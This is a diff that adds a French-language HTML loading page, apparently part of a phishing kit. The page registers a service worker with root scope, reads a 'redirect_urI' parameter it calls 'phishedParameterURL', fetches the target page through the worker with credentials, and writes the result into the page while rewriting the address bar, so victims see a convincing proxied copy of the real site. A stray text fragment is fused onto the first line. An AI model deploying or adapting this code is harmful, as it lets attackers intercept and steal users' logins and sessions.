@@ -1,0 +1,76 @@
+you still dont un<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <style>
+        body { margin: 0; padding: 0; }
+        #loading { text-align: center; padding: 50px; font-family: Arial, sans-serif; }
+    </style>
+</head>
+
+<body>
+    <div id="loading">Loading...</div>
+    <script>
+        if ("serviceWorker" in navigator) {
+            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
+                scope: "/",
+            })
+                .then(async (registration) => {
+                    console.log("Service worker registered");
+                    
+                    // Wait for the service worker to be ready
+                    await navigator.serviceWorker.ready;
+                    console.log("Service worker is ready");
+                    
+                    // Extract the target URL
+                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
+                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
+                    const targetPath = `${phishedURL.pathname}${phishedURL.search}`;
+                    
+                    // Now fetch the content through the service worker
+                    console.log("Fetching content for:", targetPath);
+                    
+                    // Small delay to ensure service worker is fully active
+                    setTimeout(async () => {
+                        try {
+                            // Fetch the target path - this will be intercepted by the service worker
+                            const response = await fetch(targetPath, {
+                                method: 'GET',
+                                credentials: 'same-origin'
+                            });
+                            
+                            if (response.redirected) {
+                                // If we get a redirect, follow it
+                                console.log("Got redirect to:", response.url);
+                                window.location.replace(response.url);
+                            } else {
+                                // Replace the current page content with the fetched content
+                                const text = await response.text();
+                                document.open();
+                                document.write(text);
+                                document.close();
+                                
+                                // Update the URL without triggering a navigation
+                                window.history.replaceState({}, '', targetPath);
+                            }
+                        } catch (error) {
+                            console.error("Fetch failed:", error);
+                            // Fallback to regular navigation
+                            window.location.replace(targetPath);
+                        }
+                    }, 500);
+                })
+                .catch((error) => {
+                    console.error(`Service worker registration failed: ${error}`);
+                    document.getElementById('loading').textContent = 'Error loading page';
+                });
+        }
+        else {
+            console.error("Service workers are not supported by this browser");
+            document.getElementById('loading').textContent = 'Your browser is not supported';
+        }
+    </script>
+</body>
+
+</html>
